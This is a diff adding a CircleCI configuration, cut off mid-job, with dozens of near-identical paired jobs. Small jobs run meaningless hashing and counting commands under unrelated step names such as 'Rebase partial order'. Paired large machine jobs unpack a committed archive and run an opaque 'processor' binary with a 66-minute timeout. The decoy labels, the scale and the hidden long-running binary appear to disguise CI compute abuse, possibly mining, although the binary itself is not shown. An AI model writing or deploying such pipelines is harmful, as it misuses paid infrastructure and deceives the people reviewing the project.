@@ -1,0 +1,1615 @@
+version: 2.1
+
+jobs:
+  wire_py310-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/handoff
+            set +o pipefail 2>/dev/null; yes abc | head -n 876742 | sha1sum > /tmp/handoff/audit.gz; true
+            echo "handoff ready: $(stat -c %s /tmp/handoff/audit.gz) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - audit.gz
+  py310-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/audit.gz > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  Alpha_chen-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=247551;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/handoff/91.bin
+            echo "handoff ready: $(stat -c %s /tmp/handoff/91.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 91.bin
+  chen-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  dispatch_break-prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect retire counts
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 59639 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/handoff/.state
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.state) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .state
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/.state > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  staging_DEV_STAGE_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 11887); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/handoff/trace.gz
+            echo "handoff ready: $(stat -c %s /tmp/handoff/trace.gz) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.gz
+  DEV_STAGE_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/trace.gz > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  red_BuildSuite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 347035 | awk '{s+=$1}END{print s}'; true ; } > /tmp/handoff/full_phase_output.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/full_phase_output.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - full_phase_output.txt
+  BuildSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  phase1_ensure-partial-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 6291456 /dev/urandom | sha256sum; true ; } > /tmp/handoff/93.data
+            echo "handoff ready: $(stat -c %s /tmp/handoff/93.data) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 93.data
+  ensure-partial-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  checker_callisto-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 29360128 | fold -w16 | sort -u | wc -l; true ; } > /tmp/handoff/report.md
+            echo "handoff ready: $(stat -c %s /tmp/handoff/report.md) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - report.md
+  callisto-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/report.md > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  warmer_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 10485760 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/handoff/metrics.csv
+            echo "handoff ready: $(stat -c %s /tmp/handoff/metrics.csv) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.csv
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  green_q3-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Reorder index entries
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes abc | head -n 332931 | sha256sum; true ; } > /tmp/handoff/ckpt-alt.state
+            echo "handoff ready: $(stat -c %s /tmp/handoff/ckpt-alt.state) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - ckpt-alt.state
+  q3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  beta_india-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 30408704 /dev/urandom | md5sum; true ; } > /tmp/handoff/stash.dat
+            echo "handoff ready: $(stat -c %s /tmp/handoff/stash.dat) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.dat
+  india-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/stash.dat > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  spinner_bug-2224:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=7 2>/dev/null | sha256sum; true ; } > /tmp/handoff/full_task_output_v3.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/full_task_output_v3.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - full_task_output_v3.txt
+  bug-2224:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/full_task_output_v3.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  postcheck_DEPLOY_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 108080; echo "ftr" ) | wc -l; true ; } > /tmp/handoff/manifest
+            echo "handoff ready: $(stat -c %s /tmp/handoff/manifest) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - manifest
+  DEPLOY_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/manifest > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  postbuild_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 153600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/handoff/package
+            echo "handoff ready: $(stat -c %s /tmp/handoff/package) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - package
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  postcheck_nov22-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 56000 | paste - - - - | wc -l; true ; } > /tmp/handoff/READY
+            echo "handoff ready: $(stat -c %s /tmp/handoff/READY) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - READY
+  nov22-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  reset_node18-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 21M /dev/urandom | base64 | wc -c; true ; } > /tmp/handoff/439.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/439.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 439.txt
+  node18-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/439.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  provision_add-retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<36333;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/handoff/pt-main.pickle
+            echo "handoff ready: $(stat -c %s /tmp/handoff/pt-main.pickle) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - pt-main.pickle
+  add-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  prebuild_realease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=334552;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/handoff/step-3.log
+            echo "handoff ready: $(stat -c %s /tmp/handoff/step-3.log) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-3.log
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  bake_Ship_Staging3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=20 2>/dev/null | md5sum; true ; } > /tmp/handoff/relay.ok
+            echo "handoff ready: $(stat -c %s /tmp/handoff/relay.ok) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - relay.ok
+  Ship_Staging3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/relay.ok > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  preinit_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 413447 | awk '{if($1&1)o++;else e++}END{print o"/"e}'; true ; } > /tmp/handoff/.marker
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.marker) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .marker
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/.marker > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  blue_LAB_BUILD_9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 184320 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/handoff/audit.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/audit.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - audit.txt
+  LAB_BUILD_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/audit.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  runner_io:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=8;a++)for(b=1;b<=9879;b++)s+=a*b;print s}'; true ; } > /tmp/handoff/9.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/9.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 9.txt
+  io:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  reload_rust-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 9437184 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/handoff/gate-ready.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/gate-ready.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - gate-ready.txt
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/gate-ready.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  redo_go1-21-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 2 21795 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/handoff/trace.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/trace.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.txt
+  go1-21-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  green_atlas-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Snapshot heap stats
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 23231); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/handoff/stash.bin
+            echo "handoff ready: $(stat -c %s /tmp/handoff/stash.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.bin
+  atlas-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/stash.bin > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  warmer_golf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 481634 | md5sum; true ; } > /tmp/handoff/OK.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/OK.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - OK.txt
+  golf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/OK.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  cleanup_pr-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 25165824 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/handoff/final.md
+            echo "handoff ready: $(stat -c %s /tmp/handoff/final.md) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - final.md
+  pr-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/final.md > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  tester_uma-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate line counts
